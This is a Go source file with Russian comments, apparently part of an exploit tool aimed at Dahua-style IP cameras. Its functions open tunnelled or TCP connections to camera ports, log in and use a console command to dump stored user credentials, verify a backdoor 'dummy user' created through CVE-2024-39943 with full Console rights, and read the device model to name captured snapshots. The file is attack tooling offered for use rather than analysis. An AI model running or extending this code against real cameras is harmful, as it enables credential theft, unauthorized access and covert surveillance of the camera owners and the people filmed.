// dial.go — p2pwn-стиль входа: функции принимают Dialer (коннект к порту
// камеры), а не адрес. Так exploiter/title работают ПОВЕРХ туннеля
// (виртуальный net.Conn без локального листенера) и через обычный TCP
// одновременно. Addr-версии — обёртки над Dial-версиями.
package dhip

import (
	"fmt"
	"net"
	"time"
)

// Dialer — открывает соединение с портом камеры (5000/80/37777).
type Dialer func() (net.Conn, error)

// AddrDialer — классический TCP-дайл на адрес (для Local()-форвардов).
func AddrDialer(addr string, timeout time.Duration) Dialer {
	return func() (net.Conn, error) { return net.DialTimeout("tcp", addr, timeout) }
}

// ExtractCredsDial — логин + console + OnvifUser -u → список пользователей.
// Каждая попытка — свежее соединение через dial (туннельные коннекты
// одноразовые: после console-сессии камера может держать мусор в буфере).
func ExtractCredsDial(dial Dialer, timeout time.Duration) ([]DhipUser, error) {
	users, err := tryExtractCredsDial(dial, timeout)
	if err == nil {
		return users, nil
	}
	if isRetryableConnErr(err) {
		// Один ретрай всей сессии (было 2 — на молчащей камере ×3 таймауты).
		time.Sleep(700 * time.Millisecond)
		users, err = tryExtractCredsDial(dial, timeout)
		if err == nil {
			return users, nil
		}
	}
	return nil, err
}

func tryExtractCredsDial(dial Dialer, timeout time.Duration) ([]DhipUser, error) {
	conn, err := dial()
	if err != nil {
		return nil, fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()
	return tryExtractCredsConn(conn)
}

// VerifyLoginDial — проверка кредов полноценным challenge-логином с
// clientType Console (полные права). Для верификации dummy-юзера из
// CVE-2024-39943 важно передавать именно имя созданного юзера.
func VerifyLoginDial(dial Dialer, user, password string, timeout time.Duration) error {
	conn, err := dial()
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	time.Sleep(2 * time.Second)

	if _, err := dhipLoginAs(conn, nil, user, password); err != nil {
		return err
	}
	return nil
}

// DeviceModelDial — модель камеры (для имён файлов снапов). Best-effort.
func DeviceModelDial(dial Dialer, timeout time.Duration) string {
	return DeviceModelDialAs(dial, "", "", timeout)
}

// DeviceModelDialAs — модель камеры с аутентификацией указанного пользователя.
func DeviceModelDialAs(dial Dialer, user, pass string, timeout time.Duration) string {
	conn, err := dial()
	if err != nil {
		return ""
	}
	defer conn.Close()
	m, err := tryDeviceModelConnAs(conn, user, pass)
	if err != nil {
		return ""
	}
	return m
}

